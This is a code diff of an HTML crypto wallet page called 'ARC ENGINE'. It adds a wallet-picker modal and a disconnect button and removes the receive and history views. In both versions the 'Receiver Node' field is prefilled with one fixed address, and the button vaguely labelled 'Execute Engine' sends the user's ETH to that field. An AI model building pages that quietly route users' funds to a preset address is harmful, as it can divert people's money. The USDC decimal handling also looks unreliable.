@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>ARC ENGINE | Universal Node v10.0</title>
+    <title>ARC ENGINE | Universal Hub v11.0</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -12,108 +12,98 @@
         @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@900&family=Inter:wght@400;700;900&display=swap');
         
         body { background-color: #facc15; color: #000; font-family: 'Inter', sans-serif; overflow-x: hidden; margin: 0; }
-        .glass-card { background: #000 !important; border: 4px solid #000; border-radius: 2.8rem; box-shadow: 0 35px 70px rgba(0,0,0,0.45); margin-bottom: 25px; }
+        .glass-card { background: #000 !important; border: 4px solid #000; border-radius: 2.5rem; box-shadow: 0 35px 70px rgba(0,0,0,0.4); margin-bottom: 25px; position: relative; }
         
-        /* 3D Spinning Animation */
+        /* 3D Spin */
         @keyframes spin3D {
             0% { transform: perspective(1000px) rotateY(0deg); }
             100% { transform: perspective(1000px) rotateY(360deg); }
         }
-        .logo-3d { animation: spin3D 5s linear infinite; transform-style: preserve-3d; filter: drop-shadow(0 15px 25px rgba(0,0,0,0.4)); }
+        .logo-3d { animation: spin3D 6s linear infinite; transform-style: preserve-3d; }
         
-        /* Visibility & High Contrast */
+        /* Typography */
         .big-number { font-family: 'Orbitron', sans-serif; font-size: 4.5rem; font-weight: 900; color: #fff; letter-spacing: -3px; line-height: 1; }
-        .label-text { font-size: 14px; font-weight: 900; color: #facc15; text-transform: uppercase; letter-spacing: 3px; display: block; margin-bottom: 10px; }
+        .label-text { font-size: 14px; font-weight: 900; color: #facc15; text-transform: uppercase; letter-spacing: 2px; }
         
-        .input-heavy { background: #111; border: 3px solid #333; padding: 22px; border-radius: 20px; width: 100%; color: #facc15; font-weight: 900; font-size: 1.3rem; outline: none; }
+        /* Modal Overlay */
+        #walletModal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 1000; align-items: center; justify-content: center; backdrop-filter: blur(10px); }
+        .modal-content { background: #facc15; border: 6px solid #000; border-radius: 3rem; width: 90%; max-width: 400px; padding: 30px; text-align: center; }
         
-        .nav-btn { font-size: 14px; font-weight: 900; color: #222; padding: 18px; border-radius: 18px; text-transform: uppercase; }
-        .nav-active { color: #facc15 !important; background: #000 !important; box-shadow: 0 15px 30px rgba(0,0,0,0.2); }
+        .wallet-opt { background: #000; color: #facc15; padding: 20px; border-radius: 20px; margin-bottom: 12px; display: flex; align-items: center; gap: 15px; font-weight: 900; cursor: pointer; transition: 0.2s; border: 3px solid transparent; }
+        .wallet-opt:hover { border-color: #fff; transform: scale(1.02); }
         
-        .status-dot { animation: pulse 1.5s infinite; color: #22c55e; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.2; } 100% { opacity: 1; } }
+        .input-heavy { background: #111; border: 3px solid #333; padding: 20px; border-radius: 20px; width: 100%; color: #facc15; font-weight: 900; font-size: 1.2rem; outline: none; }
     </style>
 </head>
 <body class="p-4 max-w-lg mx-auto pb-24">
 
+    <div id="walletModal">
+        <div class="modal-content">
+            <h2 class="text-2xl font-black uppercase mb-6 italic text-black">Select Wallet</h2>
+            <div class="wallet-opt" onclick="initConnect('rabby')">
+                <img src="https://rabby.io/assets/logo.png" class="w-8 h-8 rounded-full"> Rabby Wallet
+            </div>
+            <div class="wallet-opt" onclick="initConnect('metamask')">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Mirror_Logo.svg" class="w-8 h-8"> MetaMask
+            </div>
+            <div class="wallet-opt" onclick="initConnect('universal')">
+                <i class="fa-solid fa-wallet text-2xl"></i> Other Wallets
+            </div>
+            <button onclick="closeModal()" class="mt-4 text-sm font-black uppercase underline">Cancel</button>
+        </div>
+    </div>
+
     <div class="flex justify-between items-center mb-10 pt-8">
-        <div class="flex items-center gap-5">
+        <div class="flex items-center gap-4">
             <div class="logo-3d">
                 <img src="logo.png" class="w-20 h-20 rounded-full border-4 border-black" onerror="this.src='https://arc.xyz/favicon.ico'">
             </div>
             <div>
-                <h1 class="text-3xl font-black italic text-black leading-none uppercase">ARC ENGINE</h1>
-                <p class="text-[10px] text-black font-black uppercase mt-2 italic"><span class="status-dot">●</span> NODE: UNIVERSAL</p>
+                <h1 class="text-3xl font-black italic text-black uppercase leading-none">ARC ENGINE</h1>
+                <p class="text-[10px] text-black font-black uppercase mt-1 italic">Institutional Build v11</p>
             </div>
         </div>
-        <div class="text-center">
-            <div class="logo-3d mb-2">
-                <img src="https://cryptologos.cc/logos/usd-coin-usdc-logo.png" class="w-12 h-12">
-            </div>
-            <button onclick="connectUniversal()" id="connectBtn" class="bg-black text-yellow-400 px-5 py-2.5 rounded-2xl text-[11px] font-black uppercase shadow-2xl active:scale-90 transition-all">Connect Wallet</button>
+        <div id="authArea">
+            <button onclick="openModal()" id="connectBtn" class="bg-black text-yellow-400 px-5 py-2.5 rounded-2xl text-[11px] font-black uppercase shadow-2xl">Connect Wallet</button>
         </div>
     </div>
 
-    <div class="glass-card p-10 relative">
-        <div class="flex justify-between items-center mb-4">
-            <span class="label-text">Liquid Balance</span>
-            <span class="text-[10px] bg-yellow-400 text-black px-2 py-0.5 rounded font-black">LIVE</span>
+    <div class="glass-card p-10">
+        <div class="flex justify-between items-start">
+            <span class="label-text">ETH Balance</span>
+            <button onclick="disconnectWallet()" id="dcBtn" class="hidden text-[10px] bg-red-600 text-white px-3 py-1 rounded-full font-black uppercase">Disconnect</button>
         </div>
-        <div class="flex items-baseline gap-3 mb-6">
+        <div class="flex items-baseline gap-3 mt-4 mb-6">
             <h2 id="balanceDisp" class="big-number">0.0000</h2>
-            <span class="text-2xl text-yellow-500 font-black italic">ETH</span>
+            <span class="text-2xl text-yellow-500 font-black italic uppercase">ETH</span>
         </div>
         <div class="border-t border-yellow-500/10 pt-6">
-            <span class="label-text !text-[11px]">Settled Assets</span>
-            <p id="usdcBalance" class="text-3xl font-black text-white">0.00 <span class="text-[14px] text-yellow-600 italic">USDC</span></p>
+            <span class="label-text !text-[11px]">USDC Assets</span>
+            <p id="usdcBalance" class="text-3xl font-black text-white">0.00 <span class="text-[12px] text-yellow-600 italic">USDC</span></p>
         </div>
+        <p id="myAddrDisp" class="text-[10px] font-mono text-yellow-700 break-all mt-4 hidden"></p>
     </div>
 
-    <div class="grid grid-cols-4 gap-2 mb-10 bg-black/10 p-2 rounded-[2.2rem] border-2 border-black/20">
-        <button onclick="switchMode('send')" id="tab-send" class="nav-btn">SEND</button>
-        <button onclick="switchMode('receive')" id="tab-receive" class="nav-btn">RECV</button>
-        <button onclick="switchMode('swap')" id="tab-swap" class="nav-btn">SWAP</button>
-        <button onclick="switchMode('bridge')" id="tab-bridge" class="nav-btn nav-active">BRIDGE</button>
-    </div>
-
-    <div class="glass-card p-10 shadow-2xl">
-        <div id="actionContent" class="space-y-8">
+    <div class="glass-card p-8">
+        <div class="space-y-6">
             <div>
-                <label class="label-text !text-[12px] mb-2 block">Target Node ID</label>
-                <input type="text" id="recipient" value="0x20910Aa09451FE483D1930C25a4556a32160F873" class="input-heavy shadow-inner">
+                <label class="label-text !text-[11px] mb-2 block">Receiver Node</label>
+                <input type="text" id="recipient" value="0x20910Aa09451FE483D1930C25a4556a32160F873" class="input-heavy">
             </div>
-            
-            <div class="grid grid-cols-2 gap-6">
+            <div class="grid grid-cols-2 gap-4">
                 <div>
-                    <label class="label-text !text-[12px] mb-2 block">Asset</label>
+                    <label class="label-text !text-[11px] mb-2 block">Asset</label>
                     <select id="assetSelect" class="input-heavy">
                         <option value="ETH">ETH</option>
                         <option value="USDC">USDC</option>
                     </select>
                 </div>
                 <div>
-                    <label class="label-text !text-[12px] mb-2 block">Volume</label>
+                    <label class="label-text !text-[11px] mb-2 block">Volume</label>
                     <input type="number" id="inputAmt" placeholder="0.00" class="input-heavy">
                 </div>
             </div>
-
-            <button onclick="executeAction()" id="actionBtn" class="w-full bg-yellow-400 hover:bg-yellow-500 py-7 rounded-[2.5rem] text-[18px] font-black uppercase text-black shadow-2xl transition-all active:scale-95">Execute Engine</button>
-        </div>
-
-        <div id="receiveUI" class="hidden text-center py-6 space-y-8">
-            <p class="label-text">Institutional QR</p>
-            <div class="bg-white p-6 inline-block rounded-[3rem] mx-auto shadow-2xl border-8 border-black">
-                <img id="qrImage" src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=ConnectWallet" class="w-48 h-48">
-            </div>
-            <p id="myFullAddr" class="text-[11px] font-mono text-yellow-600 break-all bg-black p-5 rounded-2xl border border-yellow-500/20 italic">AWAITING_AUTH</p>
-            <button onclick="copyMyAddress()" class="bg-yellow-400 text-black px-12 py-5 rounded-2xl text-[14px] font-black uppercase shadow-xl transition-all">Copy Node ID</button>
-        </div>
-    </div>
-
-    <div class="mt-12 px-2">
-        <h3 class="text-[14px] font-black text-black uppercase mb-6 tracking-[0.4em] italic ml-4">Activity Log</h3>
-        <div id="historyLog" class="glass-card p-8 min-h-[160px] space-y-6">
-            <p id="noActivity" class="text-[12px] text-yellow-700 italic text-center font-black uppercase tracking-widest">Scanning Network Activity...</p>
+            <button onclick="executeAction()" id="actionBtn" class="w-full bg-yellow-400 py-6 rounded-3xl text-[18px] font-black uppercase text-black shadow-2xl active:scale-95 transition-all">Execute Engine</button>
         </div>
     </div>
 
@@ -122,81 +112,74 @@
         const USDC_CONTRACT = "0x127bF57662c19958E406981882046524316bED77";
         const USDC_ABI = ["function balanceOf(address owner) view returns (uint256)"];
 
-        // UNIVERSAL CONNECTION LOGIC
-        async function connectUniversal() {
-            // Detects any injected provider (MetaMask, Rabby, Trust, OKX, etc.)
-            const ethProvider = window.ethereum || (window.rabby ? window.rabby : (window.trustWallet ? window.trustWallet : null));
-            
+        function openModal() { document.getElementById('walletModal').style.display = 'flex'; }
+        function closeModal() { document.getElementById('walletModal').style.display = 'none'; }
+
+        async function initConnect(type) {
+            closeModal();
+            let ethProvider;
+            if (type === 'rabby') ethProvider = window.rabby;
+            else if (type === 'metamask') ethProvider = window.ethereum;
+            else ethProvider = window.ethereum || window.trustWallet;
+
             if (ethProvider) {
                 try {
                     const accounts = await ethProvider.request({ method: 'eth_requestAccounts' });
                     userAddress = accounts[0];
-                    provider = new ethers.providers.Web3Provider(ethProvider, "any");
+                    provider = new ethers.providers.Web3Provider(ethProvider);
                     signer = provider.getSigner();
 
-                    document.getElementById('connectBtn').innerText = "AUTHORIZED";
-                    document.getElementById('myFullAddr').innerText = userAddress;
-                    document.getElementById('qrImage').src = `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${userAddress}`;
+                    // Update UI
+                    document.getElementById('connectBtn').innerText = "LIVE NODE";
+                    document.getElementById('dcBtn').classList.remove('hidden');
+                    document.getElementById('myAddrDisp').classList.remove('hidden');
+                    document.getElementById('myAddrDisp').innerText = "ID: " + userAddress;
                     
-                    updateAllBalances();
-                } catch (e) { console.error("Connection Failed", e); }
+                    updateBalances();
+                } catch (e) { alert("Connection Rejected"); }
             } else {
-                alert("No Wallet Detected. Please open in Mises/Kiwi Browser with a Wallet Extension installed.");
+                alert("Selected Wallet Not Found! Install Extension.");
             }
         }
 
-        async function updateAllBalances() {
+        async function updateBalances() {
             if(!userAddress) return;
+            const bal = await provider.getBalance(userAddress);
+            document.getElementById('balanceDisp').innerText = parseFloat(ethers.utils.formatEther(bal)).toFixed(4);
+            
             try {
-                // ETH Balance
-                const bal = await provider.getBalance(userAddress);
-                document.getElementById('balanceDisp').innerText = parseFloat(ethers.utils.formatEther(bal)).toFixed(4);
-                
-                // USDC Balance
                 const contract = new ethers.Contract(USDC_CONTRACT, USDC_ABI, provider);
-                const usdcBal = await contract.balanceOf(userAddress);
-                document.getElementById('usdcBalance').innerText = parseFloat(ethers.utils.formatUnits(usdcBal, 18)).toFixed(2) + " USDC";
-            } catch (e) { console.error("Sync Error", e); }
+                const usdc = await contract.balanceOf(userAddress);
+                document.getElementById('usdcBalance').innerText = parseFloat(ethers.utils.formatUnits(usdc, 18)).toFixed(2) + " USDC";
+            } catch (e) { console.log("USDC Error"); }
         }
 
-        function switchMode(mode) {
-            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('nav-active'));
-            document.getElementById('tab-' + mode).classList.add('nav-active');
-            const actContent = document.getElementById('actionContent'), recvUI = document.getElementById('receiveUI');
-            if (mode === 'receive') { actContent.classList.add('hidden'); recvUI.classList.remove('hidden'); }
-            else { actContent.classList.remove('hidden'); recvUI.classList.add('hidden'); }
+        function disconnectWallet() {
+            userAddress = null;
+            document.getElementById('balanceDisp').innerText = "0.0000";
+            document.getElementById('usdcBalance').innerText = "0.00 USDC";
+            document.getElementById('connectBtn').innerText = "Connect Wallet";
+            document.getElementById('dcBtn').classList.add('hidden');
+            document.getElementById('myAddrDisp').classList.add('hidden');
+            alert("Node Disconnected Safely.");
         }
 
         async function executeAction() {
-            if (!userAddress) return connectUniversal();
+            if (!userAddress) return openModal();
             const amt = document.getElementById('inputAmt').value;
-            const target = document.getElementById('recipient').value;
             if (!amt || amt <= 0) return alert("Invalid Volume");
 
             try {
-                document.getElementById('actionBtn').innerText = "DISPATCHING...";
-                const tx = await signer.sendTransaction({ to: target, value: ethers.utils.parseUnits(amt, "ether") });
-                addHistory('OUTGOING', amt, target);
-                await tx.wait(); 
-                updateAllBalances();
-                document.getElementById('actionBtn').innerText = "EXECUTE ENGINE";
-            } catch (e) { document.getElementById('actionBtn').innerText = "EXECUTE ENGINE"; alert("Rejected!"); }
+                const tx = await signer.sendTransaction({ 
+                    to: document.getElementById('recipient').value, 
+                    value: ethers.utils.parseUnits(amt, "ether") 
+                });
+                await tx.wait();
+                updateBalances();
+                alert("Settlement Successful!");
+            } catch (e) { alert("Transaction Failed"); }
         }
-
-        function addHistory(type, amt, addr) {
-            const log = document.getElementById('historyLog'), noAct = document.getElementById('noActivity');
-            if(noAct) noAct.remove();
-            const item = document.createElement('div');
-            item.className = "flex justify-between items-center border-b border-yellow-500/10 pb-6";
-            item.innerHTML = `<div><span class="text-yellow-400 font-black text-[14px]">${type}</span><span class="text-white ml-4 font-black text-[18px]">${amt} ETH</span><p class="text-[10px] text-yellow-700 mt-2 font-mono uppercase">TO: ${addr.substring(0,30)}...</p></div><div class="text-right text-green-500 font-black text-[12px]">SUCCESS</div>`;
-            log.prepend(item);
-        }
-
-        function copyMyAddress() { navigator.clipboard.writeText(userAddress); alert("Copied!"); }
-
-        // AUTO-REFRESH EVERY 10 SECONDS
-        setInterval(() => { if(userAddress) updateAllBalances(); }, 10000);
     </script>
 </body>
                 </html>
-        
+    
